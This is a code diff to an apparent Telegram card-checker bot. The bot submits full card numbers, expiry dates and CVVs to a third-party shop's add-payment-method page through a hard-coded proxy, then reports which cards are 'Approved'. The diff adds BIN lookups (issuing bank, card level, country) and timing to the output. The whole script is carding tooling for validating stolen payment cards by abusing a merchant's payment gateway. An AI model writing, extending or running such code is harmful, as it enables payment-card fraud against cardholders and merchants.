@@ -1,5 +1,5 @@
 import requests as r
-import string, random, re
+import string, random, re, time
 from src.assets.functions import antispam
 from src.assets.Db import Database
 from pyrogram.types import Message
@@ -8,7 +8,7 @@ from pyrogram.enums import ParseMode
 
 session = r.Session()
 API = "https://www.myliporidex.com/my-account/add-payment-method/"
-
+BIN_API = "https://bins.antipublic.cc/bins/"
 
 proxy = {
     'http': 'http://38.154.227.167:5868',
@@ -59,6 +59,7 @@ async def getLive(card, msg):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    initial_time = time.perf_counter()
 
     headers = {
         'authority': 'www.myliporidex.com',
@@ -164,13 +165,23 @@ async def getLive(card, msg):
     hide_ip = conver_proxy.split('.')
     hide_ip[-3:] = ['x'] * 3
     show_ip= '.'.join(hide_ip)
+    BIN = card[0:6]
+    data = r.get(BIN_API+BIN).json()
+    final_time = time.perf_counter() - initial_time
     
     if 'class="button delete">Delete</a>&nbsp;' in response.text:
         mssg = f"""<b>Card Approved</b> ✅
 ━━━━━━━━━━━
 ┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
-├ <b>Gateway: Payflow + Woo</b>
-└ <b>Proxy:</b> {show_ip}"""
+└ <b>Gateway: Payflow Auth</b>
+
+┌ <b>Bin</b> <code>{data['bin']}</code>
+├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+├ <code>{data['bank']}</code>
+└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}
+
+┌ <b>Proxy:</b> {show_ip} ✅
+└ <b>Time</b> : {final_time:0.2}"""
         await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
         
     elif "15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number." in getStr(response.text, """<div class="woocommerce-MyAccount-content">
@@ -187,8 +198,15 @@ async def getLive(card, msg):
 ━━━━━━━━━━━
 ┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
 ├ <b>Response:</b> {response_code}
-├ <b>Gateway: Payflow + Woo</b>
-└ <b>Proxy:</b> {show_ip}"""
+└ <b>Gateway: Payflow Auth</b>
+
+┌ <b>Bin</b> <code>{data['bin']}</code>
+├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+├ <code>{data['bank']}</code>
+└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}
+
+┌ <b>Proxy:</b> {show_ip} ✅
+└ <b>Time</b> : {final_time:0.2}"""
         await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
 
     else:
@@ -201,8 +219,15 @@ async def getLive(card, msg):
 ━━━━━━━━━━━
 ┌ <b>card:</b> <code>{card}:{month}:{year}:{cvv}</code>
 ├ <b>Response:</b> {response_code}
-├ <b>Gateway: Payflow + Woo</b>
-└<b>Proxy:</b> {show_ip}"""
+└<b>Gateway: Payflow Auth</b>
+
+┌ <b>Bin</b> <code>{data['bin']}</code>
+├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+├ <code>{data['bank']}</code>
+└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}
+
+┌ <b>Proxy:</b> {show_ip} ✅
+└ <b>Time</b> : {final_time:0.2}"""
         await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
         
     session.cookies.clear()
